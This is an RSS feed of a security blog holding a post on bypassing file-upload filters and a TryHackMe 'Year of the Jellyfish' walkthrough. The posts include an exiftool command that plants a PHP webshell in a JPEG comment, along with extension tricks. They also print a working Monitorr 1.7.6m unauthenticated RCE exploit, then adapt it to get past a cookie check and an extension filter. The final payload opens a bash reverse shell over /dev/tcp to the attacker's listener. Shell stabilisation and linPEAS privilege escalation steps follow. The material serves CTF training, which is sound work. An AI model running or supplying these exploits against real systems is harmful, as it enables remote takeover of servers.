@@ -1,0 +1,612 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+	<channel>
+		<title>Posts on Nightmare</title>
+		<link>https://riteshpuvvada.github.io/posts/</link>
+		<description>Recent content in Posts on Nightmare</description>
+		<generator>Hugo -- gohugo.io</generator>
+		<language>en-us</language>
+		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
+		<lastBuildDate>Thu, 20 May 2021 12:05:40 +0530</lastBuildDate>
+		<atom:link href="https://riteshpuvvada.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+		
+		<item>
+			<title>Bypassing Upload Filters</title>
+			<link>https://riteshpuvvada.github.io/posts/bypassing_upload_filters/</link>
+			<pubDate>Thu, 20 May 2021 12:05:40 +0530</pubDate>
+			
+			<guid>https://riteshpuvvada.github.io/posts/bypassing_upload_filters/</guid>
+			<description>One of the challenging factors to a Hacker in a web application attack is the file upload. The first step in every attack is to get some code and inject it to the system to be attacked. The attack needs to find an uncomplicated and flawless path to get the code executed. Using a file upload attacker achieves his first step.
+Examples Attacks on application platforms  Upload .jsp file into web tree - jsp code executed as the web user Upload .</description>
+			<content type="html"><![CDATA[<p>One of the challenging factors to a <strong>Hacker</strong> in a web application attack is the file upload. The first step in every attack is to get some code and inject it to the system to be attacked. The attack needs to find an uncomplicated and flawless path to get the code executed. Using a file upload attacker achieves his first step.</p>
+<p><img src="/img/blog/backdoor.png" alt="img"></p>
+<h3 id="examples">Examples</h3>
+<h4 id="attacks-on-application-platforms">Attacks on application platforms</h4>
+<ul>
+<li>Upload <code>.jsp</code> file into web tree - jsp code executed as the web user</li>
+<li>Upload <code>.gif </code>file to be resized - image library flaw exploited</li>
+<li>Upload huge files - file space denial of service</li>
+<li>Upload file using malicious path or name - overwrite a critical file</li>
+<li>Upload file containing personal data - other users access it</li>
+<li>Upload file containing &ldquo;tags&rdquo; - tags get executed as part of being &ldquo;included&rdquo; in a web page</li>
+<li>Upload <code>.rar</code> file to be scanned by antivirus - command executed on a server running the vulnerable antivirus software</li>
+</ul>
+<h4 id="attacks-on-other-systems">Attacks on other systems</h4>
+<ul>
+<li>Upload <code>.exe</code> file into web tree - victims download trojaned executable</li>
+<li>Upload virus infected file - victims machines infected</li>
+<li>Upload <code>.html</code> file containing script - victim experiences Cross-site Scripting (XSS)</li>
+<li>Upload <code>.jpg</code> file containing a Flash object - victim experiences Cross-site Content Hijacking.</li>
+<li>Upload <code>.rar</code> file to be scanned by antivirus - command executed on a client running the vulnerable antivirus software</li>
+</ul>
+<h3 id="bypassing-blacklists">Bypassing Blacklists</h3>
+<p>Blacklisting is a type of protection where specific extensions, are prohibited from being sent to the server. Blacklisting might be an effective solution yet this can be bypassed.</p>
+<p>In addition to regular extensions, there are many alternative extensions that can bypass blacklist filters.</p>
+<pre><code>.pht, .phtml, .php3, .php4, .php5, .php6, .inc, .jspx, .jspf, .jsw, .jsv, .pHp, .Php, .phP
+</code></pre><h3 id="bypassing-whitelists">Bypassing Whitelists</h3>
+<p>Whitelisting is opposite of the blacklisting, here the server accepts only specific extension. For example a web application that allows you to upload a profile picture might only take <code>.JPEG</code>, <code>.JPG</code> or <code>.PNG</code> but it can still be bypassed.</p>
+<pre><code>shell.php.jpg, shell.php%00.jpg, shell.php\x00.jpg
+</code></pre><h3 id="exif-data">Exif data</h3>
+<p>EXIF is short for Exchangeable Image File, a format that is a standard for storing interchange information in digital photography image files using JPEG compression. Almost all new digital cameras use the EXIF annotation, storing information on the image such as shutter speed, exposure compensation, F number, what metering system was used, if a flash was used, ISO number, date and time the image was taken, whitebalance, auxiliary lenses that were used and resolution. Some images may even store GPS information so you can easily see where the images were taken!</p>
+<p>We can bypass file upload restrictions utilizes Exif data in an image. We can insert a comment that contains valid PHP code that will be executed by the server when the image is processed.</p>
+<p>We can use ExifTool to do this if it is not installed, install it with the package manager.</p>
+<pre><code>root@kali:~# apt install exiftool
+</code></pre><h4 id="exapmle">Exapmle</h4>
+<pre><code>root@kali:~/Desktop/tryhackme/advent# exiftool -Comment=&quot;&lt;?php system($_GET['cmd']); ?&gt;&quot; TryHackMe.jpg
+    1 image files updated
+    
+root@kali:~/Desktop/tryhackme/advent# file TryHackMe.jpg
+TryHackMe.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: &quot;&lt;?php system(['cmd']); ?&gt;&quot;, baseline, precision 8, 320x320, components 3
+
+root@kali:~/Desktop/tryhackme/advent# mv TryHackMe.jpg TryHackMe.php.jpg
+
+root@kali:~/Desktop/tryhackme/advent# file TryHackMe.php.jpg 
+TryHackMe.php.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: &quot;&lt;?php system(['cmd']); ?&gt;&quot;, baseline, precision 8, 320x320, components 3
+</code></pre><p>Resources<a href="https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/">🤓</a>
+<a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">🤑</a></p>
+<blockquote>
+<p>Get hands on experience with TryHackMe</p>
+</blockquote>
+<p>link to the room <a href="https://tryhackme.com/room/yearofthejellyfish">👾</a></p>
+<h1 id="year-of-the-jellyfish--a-walkthrough">Year of the Jellyfish : A Walkthrough</h1>
+<p>The detailed write-up of the TryHackMe room <strong>Year of the Jellyfish</strong></p>
+<h3 id="basic-nmap-scan">Basic Nmap scan</h3>
+<pre><code>root@kali:~/Desktop/tryhackme/YOJ# nmap -v -sC -sV 54.216.18.239
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 11:38 IST
+NSE: Loaded 151 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 11:38
+Completed NSE at 11:38, 0.00s elapsed
+Initiating NSE at 11:38
+Completed NSE at 11:38, 0.00s elapsed
+Initiating NSE at 11:38
+Completed NSE at 11:38, 0.00s elapsed
+Initiating Ping Scan at 11:38
+Scanning 54.216.18.239 [4 ports]
+Completed Ping Scan at 11:38, 0.05s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 11:38
+Completed Parallel DNS resolution of 1 host. at 11:38, 0.09s elapsed
+Initiating SYN Stealth Scan at 11:38
+Scanning ec2-54-216-18-239.eu-west-1.compute.amazonaws.com (54.216.18.239) [1000 ports]
+Discovered open port 443/tcp on 54.216.18.239
+Discovered open port 22/tcp on 54.216.18.239
+Discovered open port 21/tcp on 54.216.18.239
+Discovered open port 80/tcp on 54.216.18.239
+Completed SYN Stealth Scan at 11:39, 23.42s elapsed (1000 total ports)
+Initiating Service scan at 11:39
+Scanning 4 services on ec2-54-216-18-239.eu-west-1.compute.amazonaws.com (54.216.18.239)
+Completed Service scan at 11:39, 17.15s elapsed (4 services on 1 host)
+NSE: Script scanning 54.216.18.239.
+Initiating NSE at 11:39
+Completed NSE at 11:39, 13.95s elapsed
+Initiating NSE at 11:39
+Completed NSE at 11:39, 7.51s elapsed
+Initiating NSE at 11:39
+Completed NSE at 11:39, 0.01s elapsed
+Nmap scan report for ec2-54-216-18-239.eu-west-1.compute.amazonaws.com (54.216.18.239)
+Host is up (0.021s latency).
+Not shown: 996 filtered ports
+PORT    STATE SERVICE  VERSION
+21/tcp  open  ftp      vsftpd 3.0.3
+22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|_  2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)
+80/tcp  open  http     Apache httpd 2.4.29
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Did not follow redirect to https://robyns-petshop.thm/
+443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 400 Bad Request
+| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB
+| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
+| Issuer: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-05-21T06:07:38
+| Not valid after:  2022-05-21T06:07:38
+| MD5:   e8e5 3398 f020 aae3 d1fc 0cee 1bd9 cbfb
+|_SHA-1: 8360 f5ab 88c3 16c9 8b95 be37 8577 b874 067c a217
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+Service Info: Host: robyns-petshop.thm; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+Initiating NSE at 11:39
+Completed NSE at 11:39, 0.00s elapsed
+Initiating NSE at 11:39
+Completed NSE at 11:39, 0.00s elapsed
+Initiating NSE at 11:39
+Completed NSE at 11:39, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 63.04 seconds
+           Raw packets sent: 3012 (132.448KB) | Rcvd: 21 (864B)
+
+</code></pre><blockquote>
+<p>When I tried to open <code>54.216.18.239</code> on port 80 it just automatically redirected to <code>https://robyns-petshop.thm/</code> but got Network error. From the above Nmap scan we can view the alternative names <code>| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm</code>, so I modified my hosts file.</p>
+</blockquote>
+<pre><code>DNS:robyns-petshop.thm
+DNS Name: monitorr.robyns-petshop.thm
+DNS Name: beta.robyns-petshop.thm
+DNS Name: dev.robyns-petshop.thm
+</code></pre><pre><code>root@kali:~# nano /etc/hosts
+127.0.0.1       localhost
+10.0.2.5        kali
+54.216.18.239   robyns-petshop.thm monitorr.robyns-petshop.thm beta.robyns-petshop.thm dev.robyns-petshop.thm                                                           
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+10.10.148.116 spookysec.local
+</code></pre><blockquote>
+<p>Hurray! we are in</p>
+</blockquote>
+<p><img src="/img/blog/YOJ1.PNG" alt="img"></p>
+<blockquote>
+<p>It&rsquo;s a normal webpage and doesn&rsquo;t consist of any dynamic content, so I opened <code>monitorr.robyns-petshop.thm</code>.</p>
+</blockquote>
+<p>You can check more about Monitorr <a href="https://github.com/Monitorr/Monitorr">Here</a></p>
+<blockquote>
+<p>After spending some time on it I found <strong>Monitorr 1.7.6m</strong> is vulnerable for Authorization Bypass and Remote code Execution (RCE). For more info you can view this <a href="https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/">Detailed Bug Description</a>.</p>
+</blockquote>
+<p>When I searched <strong>Monitorr 1.7.6m</strong> on exploit-db, It showed me two exploits :</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/48981">Authorization Bypass</a></li>
+<li><a href="https://www.exploit-db.com/exploits/48980">Remote Code Execution (Unauthenticated)</a></li>
+</ul>
+<p>If you find any login page for the target website, go ahead and download the <strong>Authorization Bypass</strong>.</p>
+<p>Otherwise download the <strong>Remote Code Execution (Unauthenticated)</strong>.</p>
+<p>Here is the code</p>
+<pre><code>#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+
+# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
+# Date: September 12, 2020
+# Exploit Author: Lyhin's Lab
+# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
+# Software Link: https://github.com/Monitorr/Monitorr
+# Version: 1.7.6m
+# Tested on: Ubuntu 19
+
+import requests
+import os
+import sys
+
+if len (sys.argv) != 4:
+	print (&quot;specify params in format: python &quot; + sys.argv[0] + &quot; target_url lhost lport&quot;)
+else:
+    url = sys.argv[1] + &quot;/assets/php/upload.php&quot;
+    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/plain, */*; q=0.01&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;, &quot;Origin&quot;: sys.argv[1], &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: sys.argv[1]}
+
+    data = &quot;-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\&quot;fileToUpload\&quot;; filename=\&quot;she_ll.php\&quot;\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123&lt;?php shell_exec(\&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&quot;+sys.argv[2] +&quot;/&quot; + sys.argv[3] + &quot; 0&gt;&amp;1'\&quot;);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n&quot;
+
+    requests.post(url, headers=headers, data=data)
+
+    print (&quot;A shell script should be uploaded. Now we try to execute it&quot;)
+    url = sys.argv[1] + &quot;/assets/data/usrimg/she_ll.php&quot;
+    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}
+    requests.get(url, headers=headers)
+</code></pre><p>From the code <code>url = sys.argv[1] + &quot;/assets/php/upload.php&quot;</code>, we get the path where the image gets uploaded.</p>
+<pre><code>ERROR: is not an image or exceeds the webserver’s upload size limit.
+ERROR: ../data/usrimg/ already exists.
+ERROR: was not uploaded.
+</code></pre><p>So, the path is <code>/assets/data/usrimg</code></p>
+<p>Usage</p>
+<pre><code>root@kali:~/Desktop/tryhackme/YOJ# python3 48980.py 
+specify params in format: python 48980.py target_url lhost lport
+</code></pre><p><code>url =&gt; https://monitorr.robyns-petshop.thm/ </code>
+<code>lhost =&gt; THM VPN IP</code>
+<code>lport =&gt; 443</code></p>
+<pre><code>root@kali:~/Desktop/tryhackme/YOJ# python3 48980.py https://monitorr.robyns-petshop.thm/ 10.6.29.240 443
+Traceback (most recent call last):
+  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/connectionpool.py&quot;, line 670, in urlopen
+    httplib_response = self._make_request(
+  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/connectionpool.py&quot;, line 381, in _make_request
+    self._validate_conn(conn)
+  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/connectionpool.py&quot;, line 976, in _validate_conn
+    conn.connect()
+  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/connection.py&quot;, line 361, in connect
+    self.sock = ssl_wrap_socket(
+  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/util/ssl_.py&quot;, line 377, in ssl_wrap_socket
+    return context.wrap_socket(sock, server_hostname=server_hostname)
+  File &quot;/usr/local/lib/python3.9/ssl.py&quot;, line 500, in wrap_socket
+    return self.sslsocket_class._create(
+  File &quot;/usr/local/lib/python3.9/ssl.py&quot;, line 1040, in _create
+    self.do_handshake()
+  File &quot;/usr/local/lib/python3.9/ssl.py&quot;, line 1309, in do_handshake
+    self._sslobj.do_handshake()
+ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1123)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File &quot;/usr/local/lib/python3.9/site-packages/requests/adapters.py&quot;, line 439, in send
+    resp = conn.urlopen(
+  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/connectionpool.py&quot;, line 724, in urlopen
+    retries = retries.increment(
+  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/util/retry.py&quot;, line 439, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='monitorr.robyns-petshop.thm', port=443): Max retries exceeded with url: //assets/php/upload.php (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1123)')))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File &quot;/root/Desktop/tryhackme/YOJ/48980.py&quot;, line 24, in &lt;module&gt;
+    requests.post(url, headers=headers, data=data)
+  File &quot;/usr/local/lib/python3.9/site-packages/requests/api.py&quot;, line 119, in post
+    return request('post', url, data=data, json=json, **kwargs)
+  File &quot;/usr/local/lib/python3.9/site-packages/requests/api.py&quot;, line 61, in request
+    return session.request(method=method, url=url, **kwargs)
+  File &quot;/usr/local/lib/python3.9/site-packages/requests/sessions.py&quot;, line 530, in request
+    resp = self.send(prep, **send_kwargs)
+  File &quot;/usr/local/lib/python3.9/site-packages/requests/sessions.py&quot;, line 643, in send
+    r = adapter.send(request, **kwargs)
+  File &quot;/usr/local/lib/python3.9/site-packages/requests/adapters.py&quot;, line 514, in send
+    raise SSLError(e, request=request)
+requests.exceptions.SSLError: HTTPSConnectionPool(host='monitorr.robyns-petshop.thm', port=443): Max retries exceeded with url: //assets/php/upload.php (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1123)')))
+
+</code></pre><blockquote>
+<p>Hmm! The exploit didn&rsquo;t worked.</p>
+</blockquote>
+<p>Let&rsquo;s print the response</p>
+<pre><code>r = requests.post(url, headers=headers, data=data)
+print(r.text)
+</code></pre><p>Modified exploit :</p>
+<pre><code>import requests
+import os
+import sys
+
+if len (sys.argv) != 4:
+	print (&quot;specify params in format: python &quot; + sys.argv[0] + &quot; target_url lhost lport&quot;)
+else:
+    url = sys.argv[1] + &quot;/assets/php/upload.php&quot;
+    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/plain, */*; q=0.01&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;, &quot;Origin&quot;: sys.argv[1], &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: sys.argv[1]}
+
+    data = &quot;-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\&quot;fileToUpload\&quot;; filename=\&quot;she_ll.php\&quot;\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123&lt;?php shell_exec(\&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&quot;+sys.argv[2] +&quot;/&quot; + sys.argv[3] + &quot; 0&gt;&amp;1'\&quot;);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n&quot;
+
+    r = requests.post(url, headers=headers, data=data, verify = False) # Modified
+    print(r.text) # Printing the response 
+
+    print (&quot;A shell script should be uploaded. Now we try to execute it&quot;)
+    url = sys.argv[1] + &quot;/assets/data/usrimg/she_ll.php&quot;
+    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}
+    requests.get(url, headers=headers, verify = False)
+</code></pre><blockquote>
+<p>Let&rsquo;s run the exploit</p>
+</blockquote>
+<pre><code>root@kali:~/Desktop/tryhackme/YOJ# python3 48980.py https://monitorr.robyns-petshop.thm/ 10.6.29.240 443
+/usr/local/lib/python3.9/site-packages/urllib3/connectionpool.py:979: InsecureRequestWarning: Unverified HTTPS request is being made to host 'monitorr.robyns-petshop.thm'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
+  warnings.warn(
+&lt;div id='uploadreturn'&gt;You are an exploit.&lt;/div&gt;&lt;div id='uploaderror'&gt;ERROR: she_ll.php was not uploaded.&lt;/div&gt;&lt;/div&gt;
+A shell script should be uploaded. Now we try to execute it
+/usr/local/lib/python3.9/site-packages/urllib3/connectionpool.py:979: InsecureRequestWarning: Unverified HTTPS request is being made to host 'monitorr.robyns-petshop.thm'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
+  warnings.warn(
+
+</code></pre><p>How the hell it knows 😵?</p>
+<blockquote>
+<p>Should be Python User-Agent or would be if the exploit wasn’t explicitly spoofing our user-agent already. Perhaps a cookie?</p>
+</blockquote>
+<p>Check the 🍪 in DevTools</p>
+<p>Found a cookie called <code>isHuman</code> and value set to <code>1</code></p>
+<p>Modified exploit :</p>
+<pre><code>#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+
+# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
+# Date: September 12, 2020
+# Exploit Author: Lyhin's Lab
+# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
+# Software Link: https://github.com/Monitorr/Monitorr
+# Version: 1.7.6m
+# Tested on: Ubuntu 19
+
+import requests
+import os
+import sys
+
+if len (sys.argv) != 4:
+	print (&quot;specify params in format: python &quot; + sys.argv[0] + &quot; target_url lhost lport&quot;)
+else:
+    url = sys.argv[1] + &quot;/assets/php/upload.php&quot;
+    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/plain, */*; q=0.01&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;, &quot;Origin&quot;: sys.argv[1], &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: sys.argv[1]}
+
+    data = &quot;-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\&quot;fileToUpload\&quot;; filename=\&quot;she_ll.php\&quot;\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123&lt;?php shell_exec(\&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&quot;+sys.argv[2] +&quot;/&quot; + sys.argv[3] + &quot; 0&gt;&amp;1'\&quot;);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n&quot;
+
+    cookies = {
+    &quot;isHuman&quot; : &quot;1&quot;,
+    }
+
+    r = requests.post(url, headers=headers, data=data,verify=False,cookies = cookies)
+    
+
+    print (&quot;A shell script should be uploaded. Now we try to execute it&quot;)
+    url = sys.argv[1] + &quot;/assets/data/usrimg/she_ll.php&quot;
+    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}
+    requests.get(url, headers=headers, verify=False,cookies = cookies)
+</code></pre><p>Well it worked !!</p>
+<h3 id="filter-bypass">Filter bypass</h3>
+<p>Finally we have convinced the Web application that we are human, but it&rsquo;s still not letting us to upload anything.</p>
+<ul>
+<li>
+<p>A regex to see if <code>php</code> appears in the filename. This thing can be bypassed by using an alternative extension such as <code>.phtml</code> or <code>.phar</code></p>
+</li>
+<li>
+<p><code>she_ll.php</code> changed to <code>she_ll.jpg.phtml</code></p>
+</li>
+</ul>
+<p><strong>This is the final exploit</strong></p>
+<pre><code>import requests
+import os
+import sys
+import random
+import string
+
+if len (sys.argv) != 4:
+	print (&quot;specify params in format: python &quot; + sys.argv[0] + &quot; target_url lhost lport&quot;)
+else:
+    url = sys.argv[1] + &quot;/assets/php/upload.php&quot;
+    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, 
+    &quot;Accept&quot;: &quot;text/plain, */*; q=0.01&quot;, 
+    &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, 
+    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;, 
+    &quot;Origin&quot;: sys.argv[1], 
+    &quot;Connection&quot;: &quot;close&quot;, 
+    &quot;Referer&quot;: sys.argv[1]}
+    filename = &quot;&quot;.join([random.choice(string.ascii_lowercase) for _ in range(random.randint(5,12))])
+
+    data = f&quot;-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\&quot;fileToUpload\&quot;; filename=\&quot;{filename}.gif.phtml\&quot;\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123&lt;?php shell_exec(\&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&quot;+sys.argv[2] +&quot;/&quot; + sys.argv[3] + &quot; 0&gt;&amp;1'\&quot;);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n&quot;
+
+    cookies = {
+    &quot;isHuman&quot; : &quot;1&quot;
+    }
+
+    r = requests.post(url, headers=headers, data=data, verify=False, cookies = cookies)
+    print(r.text)
+
+    print (&quot;A shell script should be uploaded. Now we try to execute it&quot;)
+    url = sys.argv[1] + f&quot;/assets/data/usrimg/{filename}.gif.phtml&quot;
+    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}
+    requests.get(url, headers=headers, verify=False, cookies = cookies)
+</code></pre><blockquote>
+<p>Note: Here, the exploit produces random names with an extension <code>.phtml</code></p>
+</blockquote>
+<p>Let&rsquo;s exploit to get a reverse shell ..!</p>
+<p><img src="/img/blog/YOJ2.png" alt="img"></p>
+<blockquote>
+<p>Hurray! we got the shell. All we need to do is find the flags</p>
+</blockquote>
+<ol>
+<li>We need to stabilize the shell
+<ul>
+<li><code>python3 -c &quot;import pty; pty.spawn('/bin/bash')&quot;</code></li>
+<li><code>ctrl + z</code></li>
+<li><code>stty raw -echo</code></li>
+<li><code>export TERM=xterm</code></li>
+</ul>
+</li>
+<li>First flag - <code>www-data@petshop:/var/www$cat flag1.txt</code></li>
+</ol>
+<h3 id="root-privilege-escalation">Root privilege escalation</h3>
+<p>We need to run <code>linPEAS.sh</code>. I have already downloaded <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linPEAS </a></p>
+<p><img src="/img/blog/YOJ3.png" alt="img"></p>
+<p><strong>Ngrok allows you to expose a web server running on your local machine to the internet. Just tell ngrok what port your web server is listening on.</strong></p>
+<p><a href="https://ngrok.com/docs">Ngrok Documentation</a></p>
+<p><a href="https://ngrok.com/download">Download Ngrok</a></p>
+<p><strong>Updog is a replacement for Python&rsquo;s <code>SimpleHTTPServer</code>. It allows uploading and downloading via HTTP/S, can set ad hoc SSL certificates and use HTTP basic auth.</strong></p>
+<pre><code>pip install updog
+</code></pre><pre><code>www-data@petshop:/dev/shm$ chmod +x linpeas.sh
+www-data@petshop:/dev/shm$ ./linpeas.sh
+ Starting linpeas. Caching Writable Folders...
+</code></pre><blockquote>
+<p>linpeas flagged <strong>HTTP sockets</strong>
+<a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets">Sockets</a></p>
+</blockquote>
+<blockquote>
+<p>Check this for Basic Linux Privilege Escalation <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">LPE</a></p>
+</blockquote>
+<p><strong>What applications are installed? What version are they? Are they currently running?</strong></p>
